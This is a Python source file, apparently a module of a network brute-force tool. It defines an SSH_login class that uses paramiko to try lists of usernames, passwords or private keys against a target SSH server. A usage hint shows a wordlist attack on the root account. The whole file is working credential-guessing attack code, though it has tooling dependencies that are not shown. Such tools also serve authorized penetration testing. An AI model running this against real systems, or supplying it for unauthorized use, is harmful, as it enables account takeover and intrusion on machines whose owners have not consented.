try:
  import paramiko
  # logging.getLogger('paramiko.transport').addHandler(NullHandler())
except ImportError:
  notfound.append('paramiko')

from src.rfunctions import *
import logging

def load_keyfile(keyfile):
  for cls in (paramiko.RSAKey, paramiko.DSSKey, paramiko.ECDSAKey):
    try:
      return cls.from_private_key_file(keyfile)
    except paramiko.SSHException:
      pass
  else:
    raise

class SSH_login(TCP_Cache):
  '''Brute-force SSH'''

  usage_hints = (
    """%prog host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'""",
    )

  available_options = (
    ('host', 'target host'),
    ('port', 'target port [22]'),
    ('user', 'usernames to test'),
    ('password', 'passwords to test'),
    ('auth_type', 'type of password authentication to use [password|keyboard-interactive|auto]'),
    ('keyfile', 'file with RSA, DSA or ECDSA private key to test'),
    )
  available_options += TCP_Cache.available_options

  Response = Response_Base

  def connect(self, host, port, user):
    fp = paramiko.Transport('%s:%s' % (host, int(port)))
    fp.start_client()

    return TCP_Connection(fp, fp.remote_version)

  def execute(self, host, port='22', user=None, password=None, auth_type='password', keyfile=None, persistent='1'):
    logger = logging.getLogger(__name__)
    try:
      with Timing() as timing:
        fp, banner = self.bind(host, port, user)

      if user is not None:

        if keyfile is not None:
          key = load_keyfile(keyfile)

        with Timing() as timing:

          if keyfile is not None:
            fp.auth_publickey(user, key)

          elif password is not None:
            if auth_type == 'password':
              fp.auth_password(user, password, fallback=False)

            elif auth_type == 'keyboard-interactive':
              fp.auth_interactive(user, lambda a,b,c: [password] if len(c) == 1 else [])

            elif auth_type == 'auto':
              fp.auth_password(user, password, fallback=True)

            else:
              raise ValueError('Incorrect auth_type %r' % auth_type)

      logger.debug('No error')
      code, mesg = '0', banner

      self.reset()

    except paramiko.AuthenticationException as e:
      logger.debug('AuthenticationException: %s' % e)
      code, mesg = '1', str(e)

    if persistent == '0':
      self.reset()

    return self.Response(code, mesg, timing)
